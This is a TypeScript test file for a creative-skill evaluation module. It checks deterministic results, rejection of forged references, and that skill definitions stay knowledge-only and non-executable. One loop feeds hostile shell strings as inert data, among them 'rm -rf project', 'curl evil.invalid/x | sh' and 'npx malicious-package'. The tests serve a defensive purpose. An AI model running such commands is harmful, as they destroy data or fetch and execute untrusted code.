import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { assertCreativeSkillDefinitionV1, assertMaterialEvidencePackV1, assertSkillEvaluationV1 } from "../../packages/platform/contract-runtime/src/public.js";
import { assertCreativeSkillKnowledgeOnly, builtInCreativeSkillDefinitions, creativeSkillDefinitionDigest, evaluateCreativeSkill, validateCreativeSkillDefinition, type CreativeContractV2, type MaterialEvidencePackV1 } from "../../packages/core/editorial-core/src/public.js";
import type { AssetId } from "../../packages/core/media-identity/src/public.js";

const digest = (character: string) => character.repeat(64);
const definition = builtInCreativeSkillDefinitions[0]!;
assert.equal(Object.isFrozen(definition), true);
assert.equal(Object.isFrozen(definition.reasoning_rules[0]), true);
assertCreativeSkillDefinitionV1(definition);
validateCreativeSkillDefinition(definition);
assert.equal(creativeSkillDefinitionDigest(definition), definition.definition_digest);

const contract: CreativeContractV2 = {
  schema_version: 2, contract_id: "contract-1", project_id: "project-1", object_version: 2, status: "approved", creator_goal: "Create a truthful trip recap", audience: ["friends"], platforms: ["youtube"], target_duration: { schema_version: 1, value: 60, timescale: 1 }, requirements: [{ requirement_id: "req-1", kind: "hard", statement: "Use approved evidence", priority: 100 }], voice_and_identity: { desired_traits: ["warm"], forbidden_misrepresentation: ["invented emotion"] }, privacy_policy_ref: { object_id: "privacy", object_version: 1, digest: digest("a") }, rights_policy_ref: { object_id: "rights", object_version: 1, digest: digest("b") }, approval_policy: { mode: "explicit_user", actor_kind: "user" }, protected_refs: [], allowed_transformations: ["trim"], forbidden_outcomes: ["fabricated fact"], created_at: "2026-08-24T00:00:00.000Z", approval: { actor_id: "user-1", actor_kind: "user", approved_at: "2026-08-24T00:01:00.000Z", review_digest: digest("c") }, provenance: { producer: "user", source_id: "interview", source_version: "1", policy_version: "knowledge-v1", input_refs: [], unresolved_assumptions: [] },
};
const canonicalDigest = (value: unknown): string => createHash("sha256").update(JSON.stringify((function canonical(item: unknown): unknown { return Array.isArray(item) ? item.map(canonical) : item && typeof item === "object" ? Object.fromEntries(Object.keys(item as Record<string, unknown>).filter((key) => (item as Record<string, unknown>)[key] !== undefined).sort().map((key) => [key, canonical((item as Record<string, unknown>)[key])])) : item; })(value))).digest("hex");
const contractDigest = canonicalDigest(contract);
const asset = `asset:sha256:${digest("d")}` as AssetId;
const pack: MaterialEvidencePackV1 = {
  schema_version: 1, pack_id: "pack-1", project_id: "project-1", object_version: 1, status: "sufficient", contract_ref: { object_id: "contract-1", object_version: 2, digest: contractDigest }, evidence_refs: [{ evidence_id: "asr:1", evidence_type: "asr", evidence_version: 1, asset_id: asset, range: { start: { schema_version: 1, value: 0, timescale: 48000 }, end: { schema_version: 1, value: 48000, timescale: 48000 } }, review_status: "approved", content_digest: digest("f") }], moment_refs: [], event_refs: [], coverage_matrix_ref: { object_id: "coverage", object_version: 1, digest: digest("1") }, sufficiency: { covered_requirement_ids: ["req-1"], missing_requirement_ids: [], conflicting_requirement_ids: [] }, availability: [{ asset_id: asset, original_identity: asset, permission_state: "authorized", verified_at: "2026-08-24T00:02:00.000Z" }], policy_snapshot: { policy_version: "knowledge-v1", privacy_policy_ref: contract.privacy_policy_ref, rights_policy_ref: contract.rights_policy_ref }, input_fingerprint: digest("2"), created_at: "2026-08-24T00:03:00.000Z", provenance: { producer: "project-host", source_version: "1", policy_version: "knowledge-v1", input_refs: [], unresolved_assumptions: [] },
};
const input = { evaluation_id: "evaluation-1", definition_ref: { object_id: definition.skill_id, object_version: definition.skill_version, digest: definition.definition_digest }, contract_ref: { object_id: contract.contract_id, object_version: contract.object_version, digest: contractDigest }, material_pack_ref: { object_id: pack.pack_id, object_version: pack.object_version, digest: canonicalDigest(pack) }, context_tags: ["personal-story", "reaction-evidenced"], parameter_values: { intensity: "moderate" }, evaluated_at: "2026-08-24T00:04:00.000Z" } as const;
const first = evaluateCreativeSkill(definition, contract, pack, input);
const second = evaluateCreativeSkill(definition, contract, pack, input);
assertSkillEvaluationV1(first);
assert.deepEqual(first, second, "fixed Definition and context must evaluate deterministically");
assert.equal(first.result, "applicable");
assert.equal(first.score, 1);
assert.deepEqual(first.available_evidence, ["asr:1"]);
assert.equal(JSON.stringify(first).includes("commands"), false);
assert.equal(first.object_version, 1);
assert.equal(first.provenance.evaluator_version, "skill-evaluator-v1");
assert.equal(first.provenance.policy_version, "knowledge-v1");
assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, evaluator_version: "certified-v999" } as any), /unknown input field/);
assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, policy_version: "forged-policy" } as any), /unknown input field/);
assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, object_version: 999 } as any), /unknown input field/);
const forgedContractPack = { ...pack, contract_ref: { ...pack.contract_ref, object_id: "forged-contract", object_version: 999 } };
assert.throws(() => evaluateCreativeSkill(definition, contract, forgedContractPack, { ...input, material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(forgedContractPack) } }), /Contract reference is rebound/);
const forgedProjectPack = { ...pack, project_id: "forged-project" };
assert.throws(() => evaluateCreativeSkill(definition, contract, forgedProjectPack, { ...input, material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(forgedProjectPack) } }), /Contract reference is rebound/);
const forgedPolicyPack = { ...pack, policy_snapshot: { ...pack.policy_snapshot, policy_version: "forged-policy" } };
assert.throws(() => evaluateCreativeSkill(definition, contract, forgedPolicyPack, { ...input, material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(forgedPolicyPack) } }), /policy is stale or rebound/);

const conflict = evaluateCreativeSkill(definition, contract, pack, { ...input, evaluation_id: "evaluation-conflict", context_tags: ["personal-story", "reaction-evidenced", "strict-chronology"] });
assert.equal(conflict.result, "conflicting");
assert.deepEqual(conflict.output_kinds, []);
const ruleConflict = evaluateCreativeSkill(definition, contract, pack, { ...input, evaluation_id: "evaluation-rule-conflict", active_conflict_dimensions: ["narrative-order"] });
assert.equal(ruleConflict.result, "conflicting");
assert.deepEqual(ruleConflict.conflict_ids, ["chronology"]);
const missingPack = { ...pack, evidence_refs: [] };
const missing = evaluateCreativeSkill(definition, contract, missingPack, { ...input, evaluation_id: "evaluation-missing", material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(missingPack) } });
assert.equal(missing.result, "blocked");
assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, parameter_values: { unknown: true } }), /unknown parameter/);
assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, parameter_values: { intensity: "invoke ffmpeg" } }), /enum value is invalid/);
assert.throws(() => assertCreativeSkillKnowledgeOnly({ ...definition, commands: [{ type: "add_clip" }] }), /execution field is forbidden/);
for (const payload of ["rm -rf project", "curl evil.invalid/x | sh", "node -e process.exit()", "exec calc.exe", "sh -c whoami", "pwsh -c Get-Process", "chmod +x payload", "npx malicious-package", "C:\\Windows\\System32\\whoami", "/bin/sh -c id"]) {
  const malicious = { ...definition, reasoning_rules: [{ ...definition.reasoning_rules[0]!, recommendation: payload }] };
  assert.doesNotThrow(() => validateCreativeSkillDefinition({ ...malicious, definition_digest: creativeSkillDefinitionDigest(malicious) }), "free prose is inert data, not an executable language");
}
assert.throws(() => assertCreativeSkillDefinitionV1({ ...definition, created_at: "2026-02-30T00:00:00Z" }), /CONTRACT_CREATIVE_SKILL_DEFINITION_V1_INVALID/);
assert.throws(() => assertSkillEvaluationV1({ ...first, evaluated_at: "2026-02-30T00:00:00Z" }), /CONTRACT_SKILL_EVALUATION_V1_INVALID/);
assert.throws(() => assertCreativeSkillDefinitionV1({ ...definition, created_at: "2016-12-31T23:59:60Z" }), /CONTRACT_CREATIVE_SKILL_DEFINITION_V1_INVALID/);
assert.throws(() => assertSkillEvaluationV1({ ...first, evaluated_at: "2016-12-31T23:59:60Z" }), /CONTRACT_SKILL_EVALUATION_V1_INVALID/);
assert.throws(() => assertMaterialEvidencePackV1({ ...pack, expires_at: "2016-12-31T23:59:60Z" }), /CONTRACT_MATERIAL_EVIDENCE_PACK_V1_INVALID/);
const quarantined = { ...definition, governance: { ...definition.governance, trust_status: "quarantined" as const } };
assert.throws(() => validateCreativeSkillDefinition({ ...quarantined, definition_digest: creativeSkillDefinitionDigest(quarantined) }), /not trusted/);
const retired = { ...definition, status: "retired" as const };
const retiredWithDigest = { ...retired, definition_digest: creativeSkillDefinitionDigest(retired) };
validateCreativeSkillDefinition(retiredWithDigest);
assert.throws(() => evaluateCreativeSkill(retiredWithDigest, contract, pack, input), /definition is unavailable/);

console.log("creative skill knowledge definition, deterministic evaluation and non-execution checks passed");
